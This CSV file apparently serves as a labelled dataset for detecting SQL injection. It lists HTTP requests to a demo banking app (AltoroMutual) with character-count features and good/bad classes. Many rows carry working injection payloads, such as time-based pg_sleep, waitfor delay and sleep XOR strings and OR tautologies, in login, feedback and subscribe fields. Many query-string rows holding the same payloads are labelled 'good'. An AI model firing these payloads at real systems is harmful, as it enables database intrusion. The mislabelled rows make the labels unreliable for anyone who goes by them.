method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=IO2e2XW7';select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_contact.htm'%20AND%202*3*8=6*8%20AND%20'lI02'='lI02,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,"/index.jsp?content=1'""&job=MortgageLendingAccountExecutive:Sales",0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=-1%20OR%203%2B702-702-1=0%2B0%2B0%2B1%20--%20,/doSubscribe,0,0,2,0,4,0,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp?content=JyI=,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/default.jsp?content=-1""%20OR%203%2B176-176-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
POST,C2mkv71U'));select%20pg_sleep(6);%20--%20&txtEmail=sample%40email.tst,/doSubscribe,2,0,2,2,3,4,bad
GET,,/Privacypolicy.jsp?sec=1%00%C0%A7%C0%A2%252527%252522&template=US,0,0,0,0,0,0,good
POST,"btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(10)))v)/*'%2B(select(0)from(select(sleep(10)))v)%2B'""%2B(select(0)from(select(sleep(10)))v)%2B""*/",/doSubscribe,4,4,0,30,0,18,bad
GET,,/index.jsp?content=-1%20OR%203%2B456-456-1=0%2B0%2B0%2B1%20--%20&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp?content=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=Zz6HuK9n';select%20pg_sleep(3);%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,-1'%20OR%202%2B557-557-1=0%2B0%2B0%2B1%20or%20'1xzfTutc'='&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,8,0,0,0,4,0,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=%5C&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=JyI=&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2B449-449-1=0%2B0%2B0%2B1%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,0,6,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/util/serverStatusCheckService.jsp?HostName=0""XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR""Z",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,%5C&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2B5%2B83-83)&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,2,4,0,bad
GET,,/Privacypolicy.jsp?sec=Careers&template=-1%20OR%202%2B95-95-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=personal_cards.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=3TAQEtZn'));select%20pg_sleep(5);%20--%20,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B248-248-1=0%2B0%2B0%2B1&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%BF'%BF""&job=ExecutiveAssistant:Administration",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm'%20AND%202*3*8=6*8%20AND%20'ovNx'='ovNx&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
POST,1%20waitfor%20delay%20'0:0:44.43'%20--%20&passw=g00dPa%24%24w0rD&uid=e,/doLogin,4,0,2,0,5,6,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=if(now()=sysdate()%2Csleep(6)%2C0)&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,8,2,2,bad
POST,btnSubmit=Login&passw=-1'%20OR%202%2B23-23-1=0%2B0%2B0%2B1%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,0,4,2,bad
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"-1""%20OR%202%2B15-15-1=0%2B0%2B0%2B1%20--%20&passw=g00dPa%24%24w0rD&uid=1",/doLogin,0,2,2,0,4,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=%5C&template=US,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%F0''%F0""""&job=OperationalRiskManager:RiskManagement",0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B530-530-1=0%2B0%2B0%2B1%20--%20&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm&job=%BF'%BF""",0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2B544-544-1=0%2B0%2B0%2B1%20--%20,/doLogin,0,0,2,0,4,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:5'%20--%20,0,0,0,0,0,0,good
GET,,/pr/,0,0,0,0,0,0,good
GET,,/index.jsp?content=,0,0,0,0,0,0,good
GET,,/search.jsp?query=-1%20OR%203%2B646-646-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20000623=000623%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,0,6,2,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=SVh9Bqvr');select%20pg_sleep(6);%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/index.jsp?content=%40%40d23hn&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2B83-83-1=0%2B0%2B0%2B1&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,4,0,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/p1KaLmIg2kB7fZp5,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2B5%2B83-83)&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,2,4,0,bad
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=if(now()=sysdate()%2Csleep(3)%2C0),/doLogin,0,0,0,8,0,4,bad
GET,,/util/serverStatusCheckService.jsp?HostName=%5C,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1%20OR%202%2B68-68-1=0%2B0%2B0%2B1%20--%20&uid=e,/doLogin,0,0,2,0,4,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/admin/,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Q3EmZUg0';%20waitfor%20delay%20'0:0:6'%20--%20&template=US,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=z29nYoES';%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,6,0,2,0,7,4,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%BF'%BF""&job=Teller:ConsumaerBanking",0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1*1*1*1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B407-407-1=0%2B0%2B0%2B1%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1'""&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,2,2,0,0,2,0,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,"btnSubmit=Subscribe&txtEmail=0""XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR""Z",/doSubscribe,0,4,0,10,0,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=%5C,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;%20waitfor%20delay%20'0:0:9'%20--%20,/doLogin,4,0,2,0,5,6,bad
POST,btnSubmit=Subscribe&txtEmail=OoryswvD');select%20pg_sleep(10);%20--%20,/doSubscribe,2,0,2,2,3,4,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=nblvg7An';%20waitfor%20delay%20'0:0:15'%20--%20,/doSubscribe,6,0,2,0,5,4,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203%2B27-27-1=0%2B0%2B0%2B1%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,0,4,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=-1%20OR%202%2B171-171-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=(select(0)from(select(sleep(21)))v)/*'%2B(select(0)from(select(sleep(21)))v)%2B'""%2B(select(0)from(select(sleep(21)))v)%2B""*/&job=MortgageLendingAccountExecutive:Sales",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,"(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/&txtEmail=sample%40email.tst",/doSubscribe,4,4,0,30,0,18,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=%40%40oc2CA&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'""%2B(select(0)from(select(sleep(9)))v)%2B""*/",/sendFeedback,4,4,0,30,2,18,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&name=zFPWdwPk&subject=1,/sendFeedback,4,0,0,10,2,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=1'""&job=LoyaltyMarketingProgramManager:Marketing",0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&name=zFPWdwPk&subject=1",/sendFeedback,4,4,0,30,2,18,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2B736-736-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,-1'%20OR%202%2B606-606-1=0%2B0%2B0%2B1%20--%20&txtEmail=sample%40email.tst,/doSubscribe,2,0,2,0,4,0,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=stq3ZJK0';select%20pg_sleep(9);%20--%20,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=DKseFIW2';%20waitfor%20delay%20'0:0:0'%20--%20&template=US,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,%5C&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/disclaimer.htm?url=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/",0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1%20OR%202%2B799-799-1=0%2B0%2B0%2B1,/sendFeedback,0,0,0,0,4,0,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,"/util/serverStatusCheckService.jsp?HostName=%BF'%BF""",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm'%20AND%202*3*8=6*8%20AND%20'boWk'='boWk&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=%5C,/sendFeedback,0,0,0,0,2,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=1%20waitfor%20delay%20'0:0:3'%20--%20,0,0,0,0,0,0,good
POST,i8UyJpOp';select%20pg_sleep(13);%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,3,4,bad
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"%F0''%F0""""&passw=g00dPa%24%24w0rD&uid=1",/doLogin,4,4,0,0,0,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm&job=0""XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR""Z",0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2B742-742-1=0%2B0%2B0%2B1%20or%20'blCYplmF'='&subject=1,/sendFeedback,8,0,0,0,6,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=YSfSuIZB,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203%2B623-623-1=0%2B0%2B0%2B1%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,0,4,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=sPXegSfs';select%20pg_sleep(21);%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=1%20waitfor%20delay%20'0:0:6'%20--%20,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=1'""&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,2,2,0,0,2,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=X6Guw4SL'));select%20pg_sleep(6);%20--%20,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B456-456-1=0%2B0%2B0%2B1%20--%20&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/index.jsp?content=business_cards.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
